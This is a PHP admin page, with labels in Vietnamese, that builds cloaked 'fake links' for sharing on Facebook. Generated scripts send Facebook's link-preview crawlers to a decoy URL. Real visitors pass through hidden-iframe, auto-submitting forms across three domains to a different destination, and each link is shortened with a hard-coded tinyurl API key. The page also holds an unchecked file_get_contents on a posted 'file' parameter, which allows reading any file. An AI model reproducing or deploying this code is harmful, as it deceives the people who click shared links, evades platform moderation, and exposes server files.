<?php session_start(); /* Starts the session */

if (!isset($_SESSION['UserData']['Username'])) {
    header("location:index.php");
    exit;
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <style type="text/css">
        @import "bourbon";

    body {
        background: #eee !important;
    }

    .wrapper {
        margin-top: 80px;
      margin-bottom: 80px;
    }

    .form-signin {
      max-width: 380px;
      padding: 15px 35px 45px;
      margin: 0 auto;
      background-color: #fff;
      border: 1px solid rgba(0,0,0,0.1);

      .form-signin-heading,
        .checkbox {
          margin-bottom: 30px;
        }

    .checkbox {
      font-weight: normal;
    }

    .form-control {
      position: relative;
      font-size: 16px;
      height: auto;
      padding: 10px;
        @include box-sizing(border-box);

        &:focus {
          z-index: 2;
        }
    }

    input[type="text"] {
      margin-bottom: -1px;
      border-bottom-left-radius: 0;
      border-bottom-right-radius: 0;
    }

    input[type="password"] {
      margin-bottom: 20px;
      border-top-left-radius: 0;
      border-top-right-radius: 0;
    }
}

    </style>
</head>
<body>
    <div class="container">
    <form action="" method="post">
    <label>Link giả:</label>
    <input class="form-control" type="text" name="fake_link" id="textbox"/> </br>
    <label>Người đăng: (viết không dấu không hoa, VD minh)</label>
    <input class="form-control" type="text" name="user" id="textbox"/> </br>
    <label>Địa chỉ Đến:</label>
    <input class="form-control" type="text" name="url" id="textbox"/> </br>
    <input type="submit" value="Fake" class="btn btn-lg btn-primary"/></br>
    <br>
    </form>
    <?php
$listDomains = [
    'http://tuurl.info/',
    'http://minhurl.info/',
    'http://phucurl.info/',
];

$tuDomain = 'http://tuurl.info';
$minhDomain = 'http://minhurl.info';
$phucDomain = 'http://phucurl.info';

function generateRandomString($length = 100)
{
    return substr(str_shuffle(str_repeat($x = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-', ceil($length / strlen($x)))), 1, $length);
}

error_reporting(0);
if ($_POST["url"]) {
    // $n=rand(0000,9999);
    // $pathname = substr(md5(microtime()), rand(0, 26), 500);
    $pathname = generateRandomString();
    $filePhp = $pathname . ".php";
    $fileHtml = $pathname . ".html";

    $tuHtml = './tu/' . $pathname . ".html";
    $minhHtml = './minh/' . $pathname . ".html";
    $phucHtml = './phuc/' . $pathname . ".html";

    $tuUrl = $tuDomain . '/tu/' . $pathname . ".html";
    $minhUrl = $minhDomain . '/minh/' . $pathname . ".html";
    $phucUrl = $phucDomain . '/phuc/' . $pathname . ".html";

    $fakeLink = $_POST['fake_link'];
    $mainLink = $_POST['url'] . '/?utm_source=' . $_POST['user'] . '&utm_medium=Facebook';
    $fphp = fopen($filePhp, 'w');
    $fhtml = fopen($fileHtml, 'w');
    $fTuHtml = fopen($tuHtml, 'w');
    $fMinhHtml = fopen($minhHtml, 'w');
    $fPhucHtml = fopen($phucHtml, 'w');

    $htmlString = "
    <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
  <html xmlns=\"http://www.w3.org/1999/xhtml\">
  <head>
  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">
  <title></title>
  <meta property=\"fb:app_id\" content=\"\">
  <meta property=\"og:site_name\" content=\"......\">
  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">
  <meta name=\"robots\" content=\"noindex,nofollow\">
  <style>
  *{
  text-align: center;
  }
  </style>
  </head>
  <body>

  <script>
  function go() {
  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"post\" action=\"$tuUrl\";></form>';
  window.frames[0].document.forms[0].submit();
  }
  </script>
  <iframe onload=\"window.setTimeout('go()', 0)\" src=\"about:blank\" style=\"visibility:hidden\"></iframe>
  </body>
  </html>
    ";
    $htmlTu = "
<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"vi\" prefix=\"og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#\">
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />
<meta name=\"googlebot\" content=\"noarchive\"/>
<meta content=\"noindex, nofollow\" name=\"robots\"/>
<title>Loading......</title>
<meta property=\"og:url\" content=\"$fakeLink\"/>
</head>
<body>
  <script>
  function go() {
  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"post\" action=\"$minhUrl\";></form>';
  window.frames[0].document.forms[0].submit();
  }
  </script>
  <iframe onload=\"window.setTimeout('go()', 0)\" src=\"about:blank\" style=\"visibility:hidden\"></iframe>
  </body>
  </html>

    ";

    $htmlMinh = "
<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"vi\" prefix=\"og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#\">
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />
<meta name=\"googlebot\" content=\"noarchive\"/>
<meta content=\"noindex, nofollow\" name=\"robots\"/>
<title>Loading......</title>
<meta property=\"og:url\" content=\"$fakeLink\"/>
</head>
<body>
  <script>
  function go() {
  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"post\" action=\"$phucUrl\";></form>';
  window.frames[0].document.forms[0].submit();
  }
  </script>
  <iframe onload=\"window.setTimeout('go()', 0)\" src=\"about:blank\" style=\"visibility:hidden\"></iframe>
  </body>
  </html>

    ";

    $htmlPhuc = "
<html xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"vi\" prefix=\"og: http://ogp.me/ns# fb: http://ogp.me/ns/fb#\">
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />
<meta name=\"googlebot\" content=\"noarchive\"/>
<meta content=\"noindex, nofollow\" name=\"robots\"/>
<title>Loading......</title>
<meta property=\"og:url\" content=\"$fakeLink\"/>
</head>
<body>
  <script>
  function go() {
  window.frames[0].document.body.innerHTML = '<form target=\"_parent\" method=\"post\" action=\"$mainLink\";></form>';
  window.frames[0].document.forms[0].submit();
  }
  </script>
  <iframe onload=\"window.setTimeout('go()', 0)\" src=\"about:blank\" style=\"visibility:hidden\"></iframe>
  </body>
  </html>

    ";

    fwrite($fhtml, $htmlString);
    fclose($fhtml);
    fwrite($fTuHtml, $htmlTu);
    fclose($fTuHtml);
    fwrite($fMinhHtml, $htmlMinh);
    fclose($fMinhHtml);
    fwrite($fPhucHtml, $htmlPhuc);
    fclose($fPhucHtml);

    $redirectString = "
    <script type='text/javascript'>// <![CDATA[
    var d='<data:blog.url/>';
    d=d.replace(/.*\/\/[^\/]*/, '');
    location.href = '" . $fileHtml . "';
    // ]]></script>
    ";

    $phpString = '
<?php
if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/") !== false ||
    strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false
) {
header("Location: ' . $fakeLink . '", true, 301);
exit;
}
else {
header("Location: ' . $fileHtml . '", true, 301);
exit;
}
?>
';

    fwrite($fphp, $phpString);
    fclose($fphp);
    // echo "Link share: " . "<a href ='$filePhp'>" . $filePhp . "</a>";
    // $lurl = 'http://' . substr(md5(microtime()), rand(0, 26), 10) . '.' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
    $lurl = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $filePhp;
    $curl = curl_init();
    $post_data = array('format' => 'text',
        'apikey' => '85D97C460CDBCAEBIB5A',
        'provider' => 'tinyurl_com',
        'url' => $lurl);
    $api_url = 'http://tiny-url.info/api/v1/create';
    curl_setopt($curl, CURLOPT_URL, $api_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);
    $result = curl_exec($curl);
    curl_close($curl);
    echo "Link share: " . "<a href ='$result'>" . $result . "</a>";
}
?>

    <br><br>
<?php
if (isset($_POST['file'])) {
    $loadFile = file_get_contents($_POST['file']);
    var_dump($loadFile);
}
?>
<!-- <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
<textarea name="update" rows="20" cols="70">
    <?php echo file_get_contents($data); ?>
    </textarea>
    <br>
    <input type="submit" value="Update" class="btn btn-lg btn-primary"/></br>
    <br>
</form>
    </div>
</body>
</html> -->

